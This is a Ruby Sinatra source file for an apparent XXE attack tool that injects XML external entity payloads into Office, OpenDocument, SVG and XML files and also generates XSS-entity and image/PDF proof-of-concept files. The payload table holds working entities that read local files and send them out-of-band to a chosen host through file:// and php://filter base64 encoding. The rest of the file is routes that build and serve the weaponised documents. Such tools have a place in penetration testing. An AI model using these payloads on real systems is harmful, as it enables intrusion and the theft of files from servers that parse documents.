# encoding: ASCII-8BIT
require 'rubygems'
require 'sinatra'
require 'haml'
require 'json'
require 'fileutils'
require 'optparse'
require 'json'

require './lib/util'
require './model/master'

if not File.file?('./db/master.db')
    puts "|+| Database does not exist, initializing a blank one."
    out_file = File.new("./db/master.db", "w")
    out_file.puts("")
    out_file.close
end

# TODO apply to all xml in docx
# TODO OOB is incorrect
# TODO explain each menu item in help
# TODO soft link content types

set :protocols, ["http","https","ftp","jar","file","netdoc","mailto","gopher","none"]
set :types, ["docx","pptx","xlsx","svg","odt","xml","odg","odp","ods"]
set :poc_types, ["pdf","jpg","gif"]

# Keep the payloads organized
def read_payloads()
	pl = {}
	pl[ "Remote DTD public check"] = ['<!DOCTYPE roottag PUBLIC "-//OXML/XXE/EN" "IP/FILE">',"A Remote DTD causes the XML parser to make an external connection when successful. "]
	pl["Canary XML Entity"] = ['<!DOCTYPE root [<!ENTITY xxe "XE_SUCCESSFUL">]>', "The Canary XML Entity is useful to check if the application rejects a file with an entity included. No malicious application but useful to check for."]
	pl["Plain External XML Entity"] = ['<!DOCTYPE root [<!ENTITY xxe SYSTEM "FILE">]>', "A simple external XML entity. Note, the file is the value for the payload; IP and PROTOCOL are ignored by OXML XXE."]
	pl["Recursive XML Entity"] = ['<!DOCTYPE root [<!ENTITY b "XE_SUCCESSFUL"><!ENTITY xxe "RECURSE &b;&b;&b;&b;">]>', "A recursive XML Entity. This is a precursor check to the billion laughs attack."]
	pl["Canary Parameter Entity"] = ['<!DOCTYPE root [<!ENTITY % xxe "test"> %xxe;]>', "A parameter entity check. This is valuable because the entity is checked immediately when the DOCTYPE is parsed. No malicious application but useful to check for."]
	pl["Plain External Parameter Entity"] = ['<!DOCTYPE root [<!ENTITY % a SYSTEM "FILE"> %a;]>', "A simple external parameter entity. Note, the file is the value for the payload; IP and PROTOCOL are ignored by OXML XXE. Useful because the entity is checked immediately when the DOCTYPE is parsed. "]
	pl["Recursive Parameter Entity"] = ['<!DOCTYPE root [<!ENTITY % a "PARAMETER"> <!ENTITY % b "RECURSIVE %a;"> %b;]>',"Technically recursive parameter entities are not allowed by the XML spec. Should never work. Precursor to the billion laughs attack."]
	pl["Out of Bounds Attack (using file://)"] = ['<!DOCTYPE root [<!ENTITY % file SYSTEM "file://FILE"><!ENTITY % dtd SYSTEM "IP">%a;]>',"OOB is a useful technique to exfiltrate files when attacking blind. This is accomplished by leveraging the file:// protocol. See References."]
	pl["Out of Bounds Attack (using php://filter)"] = ['<!DOCTYPE root [<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=FILE"><!ENTITY % dtd SYSTEM "IP">%a;]>',"OOB is a useful technique to exfiltrate files when attacking blind. This is accomplished by leveraging the php filter \"convert.base64-encode\", which has been available since PHP 5.0.0. See References."]
	return pl
end

def oxml_file_defaults()
	d = {}
	d["docx"] = ["samples/sample.docx", "word/document.xml"]
	d["xlsx"] = ["samples/sample.xlsx", "xl/workbook.xml"]
	d["pptx"] = ["samples/sample.pptx", "ppt/presentation.xml"]
	d["odt"] =  ["samples/sample.odt", "content.xml"]
	d["odg"] =  ["samples/sample.odg", "content.xml"]
	d["odp"] =  ["samples/sample.odp", "content.xml"]
	d["ods"] =  ["samples/sample.ods", "content.xml"]

	return d
end

set :payloads, read_payloads

get '/' do
	redirect to("/build")
end

get '/build' do
	@types = settings.types
	@payloads = settings.payloads
	@protos = settings.protocols
	haml :build, :encode_html => true
end

post '/build' do
	oxmls = oxml_file_defaults()
	pl = read_payloads()

	if params["proto"] == "none"
		ip = params["hostname"]
	else
		# TODO is this correct for all protocols?
		ip = params["proto"]+"://"+params["hostname"]
	end

	if params[:file] != nil
		# TODO support svg
		# TODO support xml
		input_file = params[:file][:tempfile].read
		nname = "temp_#{Time.now.to_i}_"
		ext = params[:file][:filename].split('.').last
		rand_file = "./output/#{nname}_z.#{ext}"
		File.open(rand_file, 'wb') {|f| f.write(input_file) }
		file_exploit = rand_file
	end

	if oxmls.include?(params["file_type"])
		xml_file = params["xml_file"].size > 0 ? params["xml_file"] : oxmls[params["file_type"]][1]
		file_exploit = oxmls[params["file_type"]][0]
		fn = insert_payload_docx(file_exploit,xml_file,pl[params["payload"]][0],ip,params["exfil_file"])
	elsif params["file_type"] == "svg"
		fn = insert_payload_svg("./samples/sample.svg",pl[params["payload"]][0],ip,params["exfil_file"])
	elsif params["file_type"] == "xml"
		fn = insert_payload_xml("./samples/sample.xml",pl[params["payload"]][0],ip,params["exfil_file"])
	end

	# write entry to database
	file = Oxfile.new
	file.filename = fn.split('/').last
	file.location = fn
	file.desc = clean_html(params["desc"])
	file.type = params["file_type"]
	file.save

	send_file(fn, :filename => "#{fn.split('/').last}")
end

get '/replace' do
	@types = settings.types
	@payloads = settings.payloads
	@protos = settings.protocols
	haml :replace, :encode_html => true
end

post '/replace' do
	if params[:file] == nil
		return "Error no file included"
	end

	pl = read_payloads()

	if params["proto"] == "none"
		ip = params["hostname"]
	else
		# TODO is this correct for all protocols
		ip = params["proto"]+"://"+params["hostname"]
	end

	input_file = params[:file][:tempfile].read
	nname = "temp_#{Time.now.to_i}_"
	ext = params[:file][:filename].split('.').last
	rand_file = "./output/#{nname}_z.#{ext}"
	File.open(rand_file, 'wb') {|f| f.write(input_file) }

	# TODO logic check if svg or xml
	# TODO modify uri

	fn = string_replace(pl[params["payload"]][0],rand_file,ip,params["exfil_file"])

	if fn == "|-|"
		"|-| Could not find § in document, please verify."
	else
		# write entry to database
		file = Oxfile.new
		file.filename = fn.split('/').last
		file.location = fn
		file.desc = clean_html(params["desc"])
		file.type = fn.split('.').last
		file.save

		send_file(fn, :filename => "#{fn.split('/').last}")
	end
end

get '/xss' do
	haml :xss, :encode_html => true
end

post '/xss' do
	if params[:file] == nil
		return "Error no file included"
	end

	input_file = params[:file][:tempfile].read
	nname = "temp_#{Time.now.to_i}_"
	ext = params[:file][:filename].split('.').last
	rand_file = "./output/#{nname}_z.#{ext}"
	File.open(rand_file, 'wb') {|f| f.write(input_file) }

	# TODO logic check if svg or xml
	# TODO modify uri
	# TODO add a supported types box
	# TODO add a non-entity replacement option

	xss = "<!DOCTYPE root [<!ENTITY xxe \"#{params[:xss]}\">]>"
	xss = "<!DOCTYPE root [<!ENTITY xxe \"<![CDATA[#{params[:xss]}]>\">]>" if params[:cdata]

	fn = string_replace(xss,rand_file,"","")

	if fn == "|-|"
		"|-| Could not find § in document, please verify."
	else
		# write entry to database
		file = Oxfile.new
		file.filename = fn.split('/').last
		file.location = fn
		file.desc = clean_html(params["desc"])
		file.type = fn.split('.').last
		file.save

		send_file(fn, :filename => "#{fn.split('/').last}")
	end
end

get '/poc' do
	@types = settings.poc_types
	@protos = settings.protocols

	haml :poc, :encode_html => true
end

post '/poc' do
	if params["proto"] == "none"
		ip = params["hostname"]
	else
		# TODO is this correct for all protocols?
		ip = params["proto"]+"://"+params["hostname"]
	end

	if params["file_type"] == "pdf"
		fn = pdf_poc(ip)
	elsif params["file_type"] == "gif"
		fn = gif_poc(ip)
	elsif params["file_type"] == "jpg"
		fn = jpg_poc(ip)
	end

	# write entry to database
	file = Oxfile.new
	file.filename = fn.split('/').last
	file.location = fn
	file.desc = clean_html(params["desc"])
	file.type = params["file_type"]
	file.save

	send_file fn, :type => params["file_type"], :filename => "#{fn.split('/').last}"
end

get '/list' do
	@files = Oxfile.all()

	haml :list, :encode_html => true
end

get '/download' do
	# check if params is set
	file = Oxfile.first(:id => params["id"])

	send_file file.location, :filename => file.filename
end

get '/display' do
	haml :display, :encode_html => true
end

post '/display_file' do
	if params[:file] == nil
		return "Error no file included"
	end

	input_file = params[:file][:tempfile].read
	nname = "temp_#{Time.now.to_i}_"
	ext = params[:file][:filename].split('.').last
	rand_file = "./output/#{nname}_z.#{ext}"
	File.open(rand_file, 'wb') {|f| f.write(input_file) }

	@files = display_file(rand_file)
	haml :display_file, :encode_html => true
end

get '/view_file' do
	if params[:id] == nil
		return "Error no file included"
	end

	file = Oxfile.first(:id => params["id"])
	rand_file = file.location

	@files = display_file(rand_file)
	haml :display_file, :encode_html => true
end

get '/delete' do
	file = Oxfile.first(:id => params["id"])
	if file == nil
		redirect '/list'
	end
	file.destroy if file
	File.delete(file.location) if file.location
	redirect '/list'
end

get '/help' do
	@payloads = read_payloads()
	haml :help
end

get '/overwrite' do
	haml :overwrite, :encode_html => true
end

post '/overwrite' do
	if params[:file] == nil
		return "Error, no file included"
	end
	if params[:xml_file] == nil
		return "Error, no xml_file specified"
	end

	input_file = params[:file][:tempfile].read
	nname = "temp_#{Time.now.to_i}_"
	ext = params[:file][:filename].split('.').last
	rand_file = "./output/#{nname}_z.#{ext}"
	File.open(rand_file, 'wb') {|f| f.write(input_file) }

	if params[:replace_file] != nil
		contents = params[:replace_file][:tempfile].read
	else
		contents = params[:xml_content]
	end
	p contents
	fn = insert_payload_docx_(rand_file,params["xml_file"],contents,'','',true)

	# write entry to database
	file = Oxfile.new
	file.filename = fn.split('/').last
	file.location = fn
	file.desc = clean_html(params["desc"])
	file.type = fn.split('.').last
	file.save

	send_file(fn, :filename => "#{fn.split('/').last}")
end
